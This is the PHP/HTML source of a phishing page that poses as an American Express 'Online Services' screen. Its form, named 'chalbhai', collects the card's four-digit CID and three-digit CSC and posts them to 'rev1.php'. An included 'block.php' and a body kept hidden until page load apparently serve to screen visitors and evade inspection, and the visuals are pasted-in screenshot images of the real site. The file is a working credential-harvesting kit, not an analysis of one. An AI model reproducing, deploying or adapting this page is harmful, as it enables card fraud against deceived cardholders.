<?php
require_once 'block.php';
?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>American Express : Online Services </title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">

<style type="text/css">
div#container
{
	position:relative;
	width: 1265px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<link rel="shortcut icon"
              href="images/favicon.ico"/>
    
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
</head>
<body bgColor="#FFFFFF">
<div id="container">


<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:141px; z-index:2"><img src="images/heads.PNG" alt="" title="" border=0 width=1350 height=141></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:139px; width:1349px; height:575px; z-index:3"><img src="images/mains.PNG" alt="" title="" border=0 width=1349 height=575></div>


<form action="rev1.php" name=chalbhai id=chalbhai method=post>
<input name="cid"  required title="Please Enter Right Value" autocomplete="off" maxlength="4" type="text" style="position:absolute;width:77px;height:26px;left:310px;top:383px;z-index:6">
<input name="csc"  required title="Please Enter Right Value" autocomplete="off" maxlength="3" type="text" style="position:absolute;width:77px;height:29px;left:310px;top:476px;z-index:7">



<div id="formimage1" style="position:absolute; left:443px; top:510px; z-index:10"><input type="image" name="formimage1" width="240" height="32" src="images/confirm.PNG"></div>
<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:672px; width:1352px; height:282px; z-index:11"><img src="images/footers.PNG" alt="" title="" border=0 width=1352 height=282></div>

</div>

</body>
</html>
